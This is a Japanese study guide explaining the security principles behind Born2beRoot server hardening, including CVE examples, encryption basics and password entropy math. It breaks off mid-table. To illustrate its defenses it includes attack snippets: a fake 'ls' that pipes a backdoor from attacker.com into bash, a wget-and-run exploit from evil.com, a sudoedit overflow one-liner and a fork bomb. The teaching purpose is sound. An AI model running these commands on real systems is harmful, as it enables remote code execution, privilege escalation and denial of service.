# 06 - 設計原則 (Design Principles)

Born2beRoot の各要件の背後にあるセキュリティ設計原則を解説する。実際の CVE やセキュリティインシデント事例、暗号化アルゴリズムの概要、パスワードのエントロピー計算、ブルートフォース攻撃の数学的解析、ゼロトラストモデルとの比較を含む。

---

## 1. 最小攻撃面の原則 (Minimal Attack Surface)

### 1.1 概念

攻撃面（Attack Surface）とは、システムが外部からの攻撃に曝される部分のことである。攻撃面が小さいほど、攻撃者が悪用できるポイントが少なくなる。

攻撃面は以下の3つに分類される:

| 攻撃面の種類 | 説明 | Born2beRoot での例 |
|-------------|------|-------------------|
| ネットワーク攻撃面 | 外部からアクセス可能なポート・サービス | SSH (port 4242) |
| ソフトウェア攻撃面 | インストールされたソフトウェアの脆弱性 | sshd, cron, ufw のみ |
| 物理的攻撃面 | 物理的にアクセス可能なインターフェース | LUKS で暗号化 |

### 1.2 Born2beRoot での適用

**GUI の排除**:
- GUI にはデスクトップマネージャ、ウィンドウシステム、数百のライブラリが含まれる
- これらはすべて潜在的な脆弱性のソースとなる
- サーバー用途では GUI は不要であり、SSH でのリモート管理で十分

```
GUI あり:
  カーネル + Xorg + ディスプレイマネージャ + デスクトップ + 数百ライブラリ
  → 攻撃面: 大 (数千のバイナリ、数万のファイル)
  → パッケージ数: 約 2000-3000 パッケージ

GUI なし:
  カーネル + 最小限のサービス (sshd, cron, ufw)
  → 攻撃面: 小 (数十のバイナリ)
  → パッケージ数: 約 200-300 パッケージ
```

**実際の CVE 事例: X.org Server の権限昇格**:

- **CVE-2023-5367**: X.org Server の Out-of-bounds Write 脆弱性。ローカルユーザーが root 権限を取得可能だった。CVSS スコア 7.8 (High)。
- **CVE-2024-31080**: X.org Server の ProcXIGetSelectedEvents() にヒープバッファオーバーフロー。リモートコード実行の可能性。
- **CVE-2022-46340**: X.org Server の XTestSwapFakeInput にスタックバッファオーバーフロー。権限昇格が可能。

これらの脆弱性は全て、**GUI をインストールしていなければ影響を受けない**。Born2beRoot が GUI を排除する理由はここにある。

**UFW でのポート制限**:
- port 4242 のみを開放し、他のすべてを遮断する
- 開放ポートの数 = 攻撃者にとっての「入口」の数

```
多数ポート開放: SSH + HTTP + HTTPS + MySQL + Redis = 攻撃面: 大
  → 各サービスに個別の脆弱性リスク
  → MySQL: CVE-2023-21977 (SQL Injection)
  → Redis: CVE-2023-45145 (認証バイパス)
  → Apache: CVE-2023-25690 (HTTP Request Smuggling)

1 ポートのみ:   SSH (4242) = 攻撃面: 小
  → 攻撃者は SSH の脆弱性のみを狙える
  → SSH (OpenSSH) は長年の実績がありセキュリティが成熟している
```

**SSH ポートの変更（Security Through Obscurity の議論）**:
- デフォルトの port 22 から 4242 に変更する
- ボットによる自動化されたスキャンの大半は port 22 を標的とする
- Shodan（インターネット接続デバイスの検索エンジン）のデータによると、port 22 が開いているホストは数千万台存在

```
SSH ポート 22 を狙う攻撃の現実:

  一般的なサーバー（port 22 開放）の場合:
    → 1日あたり数千〜数万回のブルートフォース試行
    → そのほとんどがボットネットによる自動攻撃
    → /var/log/auth.log が攻撃ログで埋め尽くされる

  ポートを 4242 に変更した場合:
    → 自動スキャンの 99% 以上は port 22 しかチェックしない
    → ログのノイズが劇的に減少
    → 標的型攻撃（nmap -p- で全ポートスキャン）には無効
```

- ポート変更はセキュリティの**本質的な向上ではない**が、**無差別攻撃のノイズを減らす**効果がある
- nmap で全ポートスキャン（`nmap -p- target`）すれば 4242 の SSH は発見される
- したがって、ポート変更は**他の対策と組み合わせてのみ有効**

**OWASP による攻撃面の最小化ガイドライン**:

1. 不要なサービスを無効化する（Born2beRoot: GUI なし）
2. 不要なポートを閉じる（Born2beRoot: UFW で 4242 のみ）
3. 不要なアカウントを無効化する（Born2beRoot: root SSH 禁止）
4. 不要なライブラリを削除する（Born2beRoot: 最小インストール）
5. 不要な権限を剥奪する（Born2beRoot: sudo 制限）

---

## 2. 多層防御 (Defense in Depth)

### 2.1 概念

多層防御とは、単一のセキュリティ対策に依存せず、複数の層でセキュリティを構築する考え方。一つの層が突破されても、次の層が防御する。軍事用語に由来し、城の防御（堀、城壁、矢狭間、天守閣）に例えられる。

この原則の核心は**「どんなセキュリティ対策も完璧ではない」**という前提に立つことである。

### 2.2 Born2beRoot での多層防御構造

```
Layer 1: ネットワーク層
┌──────────────────────────────────────────────┐
│ UFW ファイアウォール (port 4242 以外遮断)     │
│                                              │
│ Layer 2: 認証層                              │
│ ┌──────────────────────────────────────────┐ │
│ │ SSH: root 禁止 + port 変更              │ │
│ │ パスワードポリシー: 強力なパスワード強制 │ │
│ │                                          │ │
│ │ Layer 3: 権限管理層                      │ │
│ │ ┌──────────────────────────────────────┐ │ │
│ │ │ sudo: 最小権限、ログ記録、TTY 必須   │ │ │
│ │ │ AppArmor: プロセスのアクセス制御     │ │ │
│ │ │                                      │ │ │
│ │ │ Layer 4: データ保護層                │ │ │
│ │ │ ┌──────────────────────────────────┐ │ │ │
│ │ │ │ LUKS 暗号化: 保存データの暗号化  │ │ │ │
│ │ │ │ パーティション分離: 障害の隔離   │ │ │ │
│ │ │ └──────────────────────────────────┘ │ │ │
│ │ └──────────────────────────────────────┘ │ │
│ └──────────────────────────────────────────┘ │
└──────────────────────────────────────────────┘
```

### 2.3 攻撃シナリオで見る多層防御の効果

```
攻撃者の目標: サーバーのデータを窃取する

Step 1: ネットワークスキャン・偵察
  → nmap でポートスキャン
  → UFW が port 4242 以外を遮断 → SSH 以外の攻撃路がない
  → port 22 はクローズ → 自動ボットの大半がここで諦める

Step 2: SSH ブルートフォース攻撃
  → port 4242 を発見、SSH サービスを確認
  → パスワードポリシー (10文字, 大小+数字, 62種) → 約26年の耐性
  → root ログイン禁止 → ユーザー名も推測が必要（二重の壁）
  → MaxAuthTries 制限で数回の失敗で切断
  → (Fail2ban があれば) IP ブロック

Step 3: 一般ユーザーとしてログイン成功（パスワード漏洩を想定）
  → sudo passwd_tries=3 → sudo パスワード推測が困難
  → sudo requiretty → Web Shell / cron 経由の不正 sudo を阻止
  → sudo ログ → 全操作が記録される → 攻撃者の行動を追跡可能
  → 攻撃者は一般ユーザーの権限しか持たない

Step 4: root 権限取得を試行（何らかの脆弱性を想定）
  → AppArmor → プロセスのファイルアクセスがプロファイルで制限
  → パーティション分離 → /tmp の noexec でエクスプロイトの実行を防止
  → secure_path → PATH 注入による権限昇格を防止

Step 5: 物理的アクセス（ディスクの盗難を想定）
  → LUKS 暗号化 → パスフレーズなしにデータは読めない
  → AES-256-XTS → 現在の技術では解読不可能
  → 最終防御線
```

### 2.4 各レイヤーの詳細と CVE 事例

| レイヤー | 保護対象 | 防御手段 | 突破された場合 | CVE 事例 |
|---------|---------|---------|--------------|----------|
| ネットワーク | 不正なアクセス | UFW | SSH のみ露出 | CVE-2023-1389 (TP-Link ルータ) |
| 認証 | 不正ログイン | SSH + パスワード | 一般権限のみ | CVE-2023-48795 (Terrapin SSH) |
| 権限管理 | 権限の悪用 | sudo + AppArmor | 制限された操作のみ | CVE-2021-3156 (sudo Baron Samedit) |
| データ保護 | データ漏洩 | LUKS | 最終防御線 | (物理的攻撃) |

**CVE-2021-3156 (Baron Samedit) の詳細**: sudo のヒープベースバッファオーバーフロー脆弱性。2011年以降の全 sudo バージョンが影響を受けた。一般ユーザーが sudo の脆弱性を悪用して root 権限を取得できた。**Born2beRoot での教訓**: sudo は強力なツールだが、sudo 自体にも脆弱性がありうる。多層防御（AppArmor、パーティション分離）で追加の保護が必要。

**CVE-2023-48795 (Terrapin Attack) の詳細**: SSH プロトコルレベルの脆弱性。中間者攻撃 (MITM) でハンドシェイクを改ざんし、暗号化の強度を下げることが可能。OpenSSH 9.6p1 で修正。**Born2beRoot での教訓**: SSH 設定のハードニングだけでなく、パッケージの定期更新（apt upgrade）も重要。

### 2.5 多層防御の実務での展開

```
Born2beRoot の多層防御         →    実務での多層防御

Layer 1: UFW                   →    WAF + CDN (CloudFlare, AWS WAF)
                                    IDS/IPS (Snort, Suricata)
                                    Network Segmentation (VPC, VLAN)

Layer 2: SSH + Password        →    MFA (Multi-Factor Authentication)
                                    SSO (Single Sign-On)
                                    Certificate-Based Auth
                                    Bastion Host / Jump Server

Layer 3: sudo + AppArmor      →    RBAC (Role-Based Access Control)
                                    SELinux / AppArmor
                                    Pod Security Policies (K8s)
                                    Privileged Access Management (PAM)

Layer 4: LUKS                  →    Encryption at Rest (EBS, KMS)
                                    Encryption in Transit (TLS)
                                    Key Management (Vault, AWS KMS)
                                    DLP (Data Loss Prevention)

Layer 5: (monitoring.sh)       →    SIEM (Splunk, Elastic)
                                    EDR (Endpoint Detection & Response)
                                    SOC (Security Operations Center)
```

---

## 3. 最小権限の原則 (Principle of Least Privilege)

### 3.1 概念

最小権限の原則（PoLP: Principle of Least Privilege）とは、ユーザーやプロセスに、その作業に必要な最小限の権限のみを与える設計原則である。NIST (National Institute of Standards and Technology) や CIS (Center for Internet Security) が推奨するセキュリティの基本原則の一つ。

### 3.2 なぜ最小権限が重要か

```
シナリオ: Web 開発者が本番サーバーで作業する場合

最小権限なし（root でログイン）:
  ssh root@server
  → ファイルの閲覧: OK  （必要）
  → サービスの再起動: OK（必要）
  → ユーザーの削除: OK  （不要だが可能）
  → ディスクのフォーマット: OK （不要だが可能）
  → rm -rf / : OK （絶対にやってはいけないが可能）

最小権限あり（一般ユーザー + 必要な sudo のみ）:
  ssh devuser@server
  → ファイルの閲覧: OK（必要）
  → サービスの再起動: sudo systemctl restart nginx OK（sudoersで許可）
  → ユーザーの削除: NG（sudoers で許可していない）
  → ディスクのフォーマット: NG
  → rm -rf / : NG
```

### 3.3 Born2beRoot での適用

**root ログインの禁止**:
```
危険な運用:
  ssh root@server → root の全権限が直接付与される
  → パスワードが漏洩 = 全権限の喪失
  → 「誰が」操作したか追跡不可能（全員が root）

安全な運用 (Born2beRoot):
  ssh kaztakam@server → 一般ユーザーでログイン
  sudo command → 必要な時だけ権限昇格
  → パスワードが漏洩しても一般権限のみ
  → sudo ログで「誰が」「何を」したか追跡可能
```

**sudo の制限**:

Born2beRoot では全コマンドの sudo 実行を許可しているが、以下の制限でリスクを軽減:

| 設定 | 目的 | 防御する攻撃 |
|------|------|-------------|
| `passwd_tries=3` | 推測攻撃の防止 | sudo パスワードのブルートフォース |
| `requiretty` | 自動化攻撃の防止 | Web Shell / cron 経由の sudo |
| `secure_path` | PATH 注入の防止 | 悪意あるバイナリの実行 |
| `log_input/log_output` | 監査証跡の確保 | 証拠隠滅の防止 |
| `badpass_message` | 情報漏洩の防止 | エラーメッセージからの情報収集 |

**secure_path の重要性（PATH 注入攻撃の防止）**:

```bash
# PATH 注入攻撃の例:

# 攻撃者が悪意ある「ls」コマンドを作成
mkdir /tmp/evil
cat > /tmp/evil/ls << 'EOF'
#!/bin/bash
# 本物の ls を実行しつつ、バックドアも実行
/bin/ls "$@"
curl http://attacker.com/backdoor.sh | bash  # バックドア
EOF
chmod +x /tmp/evil/ls

# PATH の先頭に /tmp/evil を追加
export PATH=/tmp/evil:$PATH

# secure_path がない場合:
sudo ls  # → /tmp/evil/ls が root 権限で実行される！

# secure_path がある場合:
sudo ls  # → /usr/bin/ls が実行される（secure_path で固定）
```

**requiretty の重要性**:

```
requiretty がない場合:
  → cron ジョブ、Web CGI、リモートスクリプトから sudo が実行可能
  → 攻撃者が Web 脆弱性経由で sudo コマンドを実行できる

requiretty がある場合:
  → sudo は端末 (TTY) に接続されたセッションからのみ実行可能
  → Web Shell 経由の sudo 実行を阻止
  → cron からの sudo 実行も阻止（意図的な場合は別途設定が必要）
```

**実務での厳密な sudo 設定例**:

```
# Born2beRoot の設定（全コマンド許可）:
kaztakam ALL=(ALL:ALL) ALL

# 実務でのより制限された設定:
# Web チームリーダー: Web サーバー関連のみ
webadmin ALL=(ALL) /usr/bin/systemctl restart nginx, \
                   /usr/bin/systemctl reload nginx, \
                   /usr/bin/certbot renew

# データベース管理者: DB 関連のみ
dbadmin ALL=(ALL) /usr/bin/systemctl restart mariadb, \
                  /usr/bin/mysql, \
                  /usr/bin/mysqldump

# 監視担当: 読み取り専用の操作のみ
monitor ALL=(ALL) NOPASSWD: /usr/bin/ss, \
                            /usr/bin/df, \
                            /usr/bin/free, \
                            /usr/bin/top -bn1
```

### 3.4 CVE-2021-3156 (Baron Samedit) - sudo の脆弱性

2021年1月に公開された sudo の重大な脆弱性。10年以上にわたって全ての sudo バージョンに存在していた。

```
脆弱性の概要:
  名前: Baron Samedit (CVE-2021-3156)
  発見者: Qualys Research Team
  CVSS スコア: 7.8 (High)
  影響: 任意のローカルユーザーが root 権限を取得可能
  原因: sudoedit のコマンドライン引数処理におけるヒープバッファオーバーフロー

攻撃方法:
  $ sudoedit -s '\' $(python3 -c "print('A' * 65536)")
  → ヒープバッファオーバーフローが発生
  → 攻撃者が root シェルを取得

Born2beRoot での教訓:
  1. sudo は強力だが、sudo 自体にも脆弱性がありうる
  2. 定期的な apt update && apt upgrade が重要
  3. 多層防御（AppArmor がこの攻撃を緩和する可能性）
  4. 監視ログで異常な sudo 使用を検知する必要がある
```

---

## 4. 関心の分離 (Separation of Concerns)

### 4.1 パーティション分割での適用

Bonus のパーティション構成は、関心の分離の原則を体現している:

```
/          → OS の基本ファイル (10GB)
  問題: / が一杯になると OS 全体が動作しなくなる
  対策: 変動するデータを別パーティションに分離

/home      → ユーザーデータ (5GB)
  利点: ユーザーが大量のファイルを保存しても OS に影響しない
  利点: OS を再インストールしても /home のデータを保持可能
  実例: ユーザーが大容量ファイルをアップロードしても / は影響しない

/var       → 可変データ（ログ、キャッシュ、メール） (3GB)
  利点: ログの肥大化が / パーティションに影響しない
  実例: Web サーバーのアクセスログが急増しても OS は安定

/var/log   → ログファイル (4GB)
  利点: ログが /var を圧迫しない（二重の保護）
  利点: ログの管理・バックアップが容易
  セキュリティ: ログの改ざんが困難（別パーティションのため）

/tmp       → 一時ファイル (3GB)
  利点: noexec オプションで実行を防止可能
  利点: nosuid オプションで SUID ビットを無効化可能
  利点: 一時ファイルの肥大化が / に影響しない

/srv       → サービスのデータ（Web, FTP 等） (3GB)
  利点: サービスのデータを OS から分離
  実例: WordPress のファイルが肥大化しても OS は影響しない

[SWAP]     → メモリスワップ領域 (2.3GB)
  利点: 物理メモリ不足時の仮想メモリ
```

### 4.2 パーティション分割が防ぐ攻撃

**ログ爆発攻撃（Log Flooding Attack）**:

攻撃者が意図的に認証失敗を大量に発生させて、ログファイルでディスクを埋め尽くす攻撃。

```
攻撃手法:
  for i in $(seq 1 1000000); do
    ssh invalid_user@target -p 4242  # 認証失敗を大量に発生させる
  done
  → /var/log/auth.log が急速に肥大化

パーティション分割なし:
  / パーティション (全体で 30GB)
  → /var/log/auth.log が肥大化
  → / が 100% になる
  → OS が停止（新しいファイルを作成できない）
  → sshd も起動できなくなる → 復旧不可能

パーティション分割あり:
  / パーティション (10GB)
  /var/log パーティション (4GB, 別パーティション)
  → /var/log が 100% になる
  → / は影響を受けない
  → OS は正常に動作し続ける
  → logrotate でログをローテーションして復旧可能
```

**/tmp を使った攻撃の防御**:

```
攻撃手法: /tmp にエクスプロイトを配置して実行
  $ wget http://evil.com/exploit -O /tmp/exploit
  $ chmod +x /tmp/exploit
  $ /tmp/exploit  # 権限昇格を試みる

/tmp が / と同じパーティション（マウントオプションなし）:
  → exploit の実行が可能
  → SUID ビットが有効

/tmp が別パーティション + noexec,nosuid:
  fstab: /dev/mapper/lvm--vg-tmp /tmp ext4 defaults,noexec,nosuid,nodev 0 2
  → /tmp/exploit を実行しようとしても "Permission denied"
  → SUID ビットが無効化されている
  → 攻撃者の権限昇格を阻止
```

### 4.3 実際のインシデント事例

**2017年: GitLab のディスク容量枯渇インシデント**:

GitLab.com でデータベースのログが急増し、ディスク容量が枯渇。サービスが数時間にわたって停止した。パーティション分割が適切であれば、ログ用パーティションのみが影響を受け、サービス本体は動作を継続できた可能性がある。

**Symlink 攻撃（/tmp 経由）**:

```
攻撃手法:
  1. 攻撃者が /tmp にシンボリックリンクを作成
     ln -s /etc/shadow /tmp/tempfile
  2. 特権プロセスが /tmp/tempfile に書き込む
     → 実際には /etc/shadow が上書きされる
  3. パスワードハッシュが攻撃者の設定したものに置き換わる

防御:
  /tmp を別パーティションにし、nodev,nosuid,noexec をマウントオプションに設定
  sticky bit (chmod +t /tmp) を設定
  → シンボリックリンクの悪用を防止
```

---

## 5. 監視と監査 (Monitoring and Auditing)

### 5.1 概念

セキュリティは「設定して終わり」ではなく、継続的な監視と監査が不可欠である。NIST Cybersecurity Framework の5つの機能の一つに「Detect（検知）」があり、異常を早期に発見し、インシデント発生時に原因を追跡できるようにすることが求められる。

### 5.2 Born2beRoot での適用

**monitoring.sh による定期的な監視**:

| 指標 | 正常値 | 異常の兆候 | 可能性のある攻撃 | 対応方法 |
|------|--------|-----------|----------------|---------|
| CPU load | 低〜中程度 | 急激な上昇 | 暗号通貨マイニング (Cryptojacking) | プロセスの特定と停止 |
| Memory usage | 安定 | 急増 | Fork bomb, メモリリーク | ulimit 設定、プロセス停止 |
| Disk usage | 緩やかな増加 | 急激な増加 | Log flooding, データ窃取の準備 | logrotate、不審ファイルの削除 |
| TCP connections | 既知接続のみ | 未知の接続 | C2通信、リバースシェル | 接続先 IP の調査、ファイアウォール遮断 |
| User log | 既知ユーザー | 未知ユーザー、深夜のログイン | ブルートフォース成功 | パスワード変更、アクセス遮断 |
| Sudo commands | 緩やかな増加 | 急増 | 権限昇格の試行 | sudo ログの詳細分析 |

**Cryptojacking（暗号通貨マイニング攻撃）の検知**:

```
monitoring.sh での検知ポイント:

CPU load が突然 90% 以上に跳ね上がる:
  → 正常な Born2beRoot サーバーでは CPU load は低い
  → 急激な上昇はマイニングソフト（xmrig 等）の可能性

確認コマンド:
  top -bn1 | head -20        # CPU 使用率の高いプロセスを特定
  ps aux --sort=-%cpu        # CPU 使用率でソート
  netstat -tlnp              # 不審なネットワーク接続
  find / -name "xmrig" 2>/dev/null  # マイニングソフトの検索
```

**Fork Bomb 攻撃の検知**:

```
Fork Bomb とは:
  :(){ :|:& };:
  → 自分自身を再帰的にフォークするプロセス
  → メモリとプロセステーブルを瞬時に枯渇させる

monitoring.sh での検知:
  → Memory Usage が急激に 100% に到達
  → プロセス数（ps aux | wc -l）が異常に増加

防御:
  /etc/security/limits.conf で最大プロセス数を制限
  * hard nproc 1000
  → 1ユーザーあたり最大 1000 プロセス
```

### 5.3 sudo ログによるフォレンジック

```
sudo ログの分析例:

/var/log/sudo/sudo.log の内容:
  Jan 15 10:30:01 kaztakam42 sudo: kaztakam : TTY=pts/0 ;
    PWD=/home/kaztakam ; USER=root ; COMMAND=/usr/bin/apt update

  Jan 15 22:45:30 kaztakam42 sudo: unknown_user : TTY=pts/1 ;
    PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
    ← 不審: 深夜に /tmp から /etc/shadow を読もうとしている

  Jan 15 22:45:45 kaztakam42 sudo: unknown_user : 3 incorrect password
    attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
    ← 不審: パスワード 3 回失敗 → ブルートフォース試行

フォレンジック分析のポイント:
  1. 時間帯: 通常の作業時間外のアクセスは要注意
  2. 実行ディレクトリ (PWD): /tmp からの実行は不審
  3. 実行コマンド: /etc/shadow の読み取り、シェルの起動
  4. ユーザー: 未知のユーザーからの sudo 試行
  5. 失敗回数: 連続した失敗はブルートフォースの兆候
```

### 5.4 実務での監視ツールとの対比

| Born2beRoot | 実務ツール | 機能 |
|-------------|----------|------|
| monitoring.sh | Prometheus + Grafana | メトリクス収集と可視化 |
| /var/log/sudo | auditd + SIEM (Splunk) | 監査ログの集約と分析 |
| wall コマンド | PagerDuty / Slack Alert | アラート通知 |
| cron (10分間隔) | Prometheus (15秒間隔) | 定期的なデータ収集 |
| 手動ログ確認 | Elasticsearch + Kibana | ログの検索と可視化 |

---

## 6. 暗号化の技術的詳細

### 6.1 暗号化の基本概念

```
暗号化の種類:

1. 対称鍵暗号（Symmetric Key Encryption）
   → 暗号化と復号に同じ鍵を使う
   → 例: AES (LUKS で使用)
   → 高速、大量データの暗号化に適する

2. 非対称鍵暗号（Asymmetric Key Encryption / 公開鍵暗号）
   → 暗号化と復号に異なる鍵（公開鍵と秘密鍵）を使う
   → 例: RSA, Ed25519 (SSH 鍵で使用)
   → 低速、鍵交換やデジタル署名に適する

3. ハッシュ関数（Hash Function）
   → 一方向の変換（元に戻せない）
   → 例: SHA-256, SHA-512 (パスワードハッシュで使用)
   → データの整合性検証、パスワードの安全な保存

Born2beRoot での使用:
  LUKS: AES-256-XTS （対称鍵、ディスク暗号化）
  SSH:  Ed25519/RSA （非対称鍵、認証）
       AES-256-GCM （対称鍵、通信の暗号化）
  Password: SHA-512 + salt （ハッシュ、パスワード保存）
```

### 6.2 AES (Advanced Encryption Standard)

LUKS で使用される暗号化アルゴリズム:

- **歴史**: 2001年に NIST が標準化。旧標準の DES (56bit 鍵) の後継として、世界的な公開コンペで選定された
- **設計**: Rijndael 暗号が採用された（ベルギーの暗号学者 Joan Daemen と Vincent Rijmen が設計）
- **鍵長**: 128, 192, 256 ビット。Born2beRoot の LUKS では 256 ビットを使用
- **ブロックサイズ**: 128 ビット（16 バイト）
- **ラウンド数**: AES-128 = 10ラウンド, AES-192 = 12ラウンド, AES-256 = 14ラウンド
- **暗号化モード**: LUKS では XTS モード（ディスク暗号化に最適化されたモード）

```
AES の暗号化プロセス（概念的）:

平文ブロック (128 bit)
      │
      ▼
  [Round 1]  ── SubBytes → ShiftRows → MixColumns → AddRoundKey
      │
      ▼
  [Round 2]  ── SubBytes → ShiftRows → MixColumns → AddRoundKey
      │
      ▼
     ...      (合計 14 ラウンド for AES-256)
      │
      ▼
  [Round 14] ── SubBytes → ShiftRows → AddRoundKey
      │
      ▼
暗号文ブロック (128 bit)
```

**AES の安全性**:
- AES-256 への最良の攻撃は biclique 攻撃で、計算量を 2^256 から 2^254.4 に削減するが、**実用上は完全に安全**
- 2^256 ≈ 1.16 x 10^77。宇宙の全原子数（約 10^80）のオーダーに匹敵
- 仮に地球上の全コンピューターの計算能力を結集しても、宇宙の寿命（約 10^17 秒）をかけても解読不可能

**DES から AES への進化**:

| 項目 | DES (旧標準) | AES (現標準) |
|------|-------------|-------------|
| 鍵長 | 56 ビット | 128/192/256 ビット |
| ブロック長 | 64 ビット | 128 ビット |
| 安全性 | 1999年に解読済 | 現在も安全 |
| 用途 | レガシーシステム | 現在の標準 |

### 6.3 XTS モード（ディスク暗号化）

LUKS は AES を XTS (XEX-based Tweaked-codebook mode with cipher text Stealing) モードで使用する。

```
なぜ XTS モードが必要か:

一般的な暗号化モード (CBC) の問題:
  → 同じ平文ブロックが同じ位置にあると、同じ暗号文になる
  → ディスクの特定セクターの内容を推測できる可能性

XTS モードの利点:
  → セクター番号を「tweak」として暗号化に組み込む
  → 同じデータでもセクター位置が異なれば異なる暗号文になる
  → ディスク暗号化に特化した設計
```

### 6.4 SHA-256 / SHA-512

パスワードハッシュとデータ整合性検証に使用:

- **SHA-256**: 256ビットのハッシュ値を生成。ファイル整合性検証に使用
- **SHA-512**: 512ビットのハッシュ値。Debian のデフォルトパスワードハッシュ（`$6$` プレフィックス）
- **一方向性**: ハッシュから元のデータを逆算することは計算上不可能
- **衝突耐性**: 同じハッシュ値を生成する2つの異なる入力を見つけることが困難
- **雪崩効果**: 入力の1ビットの変更で、ハッシュ値の約50%が変化

```
SHA-512 の例:
  入力: "password"
  出力: b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb9...
        (128文字の16進数 = 512ビット)

  入力: "Password" (大文字 P に変更)
  出力: e4c3f5f4d05e3aa7e0b6c2c8c70ea6f1... (完全に異なるハッシュ値)
  → 1文字の変更でハッシュ値が完全に変わる（雪崩効果）
```

### 6.5 パスワードの保存メカニズム

```
パスワード "MySecurePass1" の保存プロセス:

  Step 1: salt の生成
    → ランダムな文字列を生成（例: "abc123xyz"）
    → salt はユーザーごとに異なる → レインボーテーブル攻撃を防止

  Step 2: ハッシュの計算
    → hash = SHA-512(salt + password) を数千回反復
    → 反復（Key Stretching）により総当たり攻撃の速度を低下させる

  Step 3: /etc/shadow に保存
    → $6$abc123xyz$<ハッシュ値>
    → $6$ = SHA-512 アルゴリズム
    → abc123xyz = salt
    → <ハッシュ値> = 最終的なハッシュ

  認証時:
    1. ユーザーがパスワードを入力
    2. /etc/shadow から salt を取得
    3. 同じプロセスでハッシュを計算
    4. 保存されているハッシュと比較
    5. 一致すれば認証成功
```

**レインボーテーブル攻撃と salt の防御**:

```
レインボーテーブルとは:
  → 膨大な数のパスワードとそのハッシュ値を事前に計算した表
  → ハッシュ値から元のパスワードを逆引きする

salt がない場合:
  "password" → hash_a
  → レインボーテーブルで hash_a を検索 → "password" を発見

salt がある場合:
  "password" + "random_salt_1" → hash_b
  "password" + "random_salt_2" → hash_c
  → 同じパスワードでも異なるハッシュ値になる
  → salt ごとにレインボーテーブルを作る必要がある
  → 実質的にレインボーテーブル攻撃が無効化される
```

### 6.6 LUKS の構造

```
LUKS ディスクの構造:

┌─────────────────────────────────────────────┐
│ LUKS ヘッダー (2MB)                          │
│ ┌─────────────────────────────────────────┐ │
│ │ マジックナンバー: "LUKS\xba\xbe"       │ │
│ │ バージョン: 2                           │ │
│ │ 暗号アルゴリズム: aes-xts-plain64       │ │
│ │ ハッシュ: sha256                        │ │
│ │ MK (Master Key) のハッシュ              │ │
│ │ Key Slot 0: パスフレーズ1 → MK         │ │
│ │ Key Slot 1: パスフレーズ2 → MK (予備)  │ │
│ │ Key Slot 2-7: (未使用)                  │ │
│ └─────────────────────────────────────────┘ │
├─────────────────────────────────────────────┤
│ 暗号化されたデータ領域                       │
│ (AES-256-XTS で暗号化)                       │
│ (Master Key で暗号化/復号)                    │
└─────────────────────────────────────────────┘

復号プロセス:
  1. パスフレーズを入力
  2. Key Slot でパスフレーズ → Master Key に変換
  3. Master Key でデータ領域を復号
  4. dm-crypt がカーネルレベルで透過的に暗号化/復号

  アプリケーション
      ↓ 読み書き
  ファイルシステム (ext4)
      ↓
  dm-crypt (暗号化レイヤー) ← Master Key
      ↓
  物理ディスク (暗号化されたデータ)
```

---

## 7. パスワードの強度 - 数学的解析

### 7.1 エントロピーの計算

パスワードのエントロピー（情報量）は、パスワードの予測困難性を表す指標。

```
エントロピー (ビット) = log2(文字種 ^ 文字数)

Born2beRoot のポリシー (10文字, 大小英字+数字, 62種):
  エントロピー = log2(62^10) = 10 x log2(62) = 10 x 5.954 ≈ 59.5 bits

各パターンの比較:
  4文字, 数字のみ (10種):     log2(10^4)  ≈ 13.3 bits  (PIN コード)
  6文字, 小文字のみ (26種):   log2(26^6)  ≈ 28.2 bits  (非常に弱い)
  8文字, 小文字のみ (26種):   log2(26^8)  ≈ 37.6 bits  (弱い)
  8文字, 大小+数字 (62種):    log2(62^8)  ≈ 47.6 bits  (中程度)
  10文字, 大小+数字 (62種):   log2(62^10) ≈ 59.5 bits  ← Born2beRoot
  12文字, 全記号含む (95種):  log2(95^12) ≈ 78.8 bits  (強い)
  16文字, 全記号含む (95種):  log2(95^16) ≈ 105.1 bits (非常に強い)
  20文字, 小文字のみ (26種):  log2(26^20) ≈ 94.0 bits  (パスフレーズ)

推奨:
  NIST SP 800-63B: 最低 8 文字、辞書攻撃への耐性
  Born2beRoot: 最低 10 文字 + 複雑さ要件 ≈ 59.5 bits
  OWASP: パスフレーズ推奨（20文字以上の自然言語）
```

### 7.2 ブルートフォース攻撃の所要時間

```
前提: 攻撃者の計算能力

オフライン攻撃（ハッシュファイルを盗んだ場合）:
  → GPU: 毎秒 10^9 回（10億回）の SHA-512 計算
  → ASIC: 毎秒 10^12 回（1兆回）

オンライン攻撃（SSH への直接攻撃）:
  → ネットワーク遅延により毎秒 10-100 回程度
  → MaxAuthTries 制限でさらに制限

オフライン攻撃での所要時間 (GPU: 10^9/秒):
  4文字, 数字のみ:       10^4  / 10^9 = 0.00001 秒  → 瞬時
  6文字, 小文字:          26^6  / 10^9 = 0.3 秒      → 瞬時
  8文字, 小文字:          26^8  / 10^9 = 208 秒       ≈ 3.5 分
  8文字, 大小+数字:       62^8  / 10^9 = 2.18x10^5 秒 ≈ 2.5 日
  10文字, 大小+数字:      62^10 / 10^9 = 8.39x10^8 秒 ≈ 26.6 年  ← Born2beRoot
  12文字, 全記号含む:     95^12 / 10^9 = 5.40x10^14秒 ≈ 1700万年
  16文字, 全記号含む:     95^16 / 10^9 = 4.40x10^22秒 ≈ 1.4x10^15年

PBKDF2 の反復を考慮（5000回反復の場合）:
  10文字, 大小+数字: 26.6年 x 5000 = 約 13.3 万年

→ Born2beRoot のパスワードポリシーは、オフライン攻撃でも
  PBKDF2 なしで約 26 年、PBKDF2 ありで約 13 万年の耐性を持つ
```

### 7.3 辞書攻撃（Dictionary Attack）

```
ブルートフォースの改良版:
  → 辞書に載っている単語やよく使われるパスワードを優先的に試行
  → "password123", "admin", "qwerty" 等はほぼ瞬時に突破される

Born2beRoot のパスワードポリシーによる防御:
  → 最小10文字: 短い辞書単語を排除
  → 大文字必須: "password" → NG
  → 数字必須: "Password" → NG
  → 連続3文字以下: "aaaaaa" → NG
  → ユーザー名を含まない: "kaztakam1" → NG
  → 旧パスワードと7文字以上異なる: 少しだけ変えるのを防止

よく使われるパスワード（上位10）:
  1. 123456
  2. password
  3. 123456789
  4. 12345678
  5. 12345
  6. 1234567
  7. qwerty
  8. abc123
  9. 111111
  10. password1

→ Born2beRoot のポリシーは上記の全てを拒否する
```

---

## 8. 実際のセキュリティインシデントと Born2beRoot の対策

### 8.1 インシデント事例の詳細

| インシデント | CVE / 事例 | 攻撃手法 | Born2beRoot の対策 | 補足 |
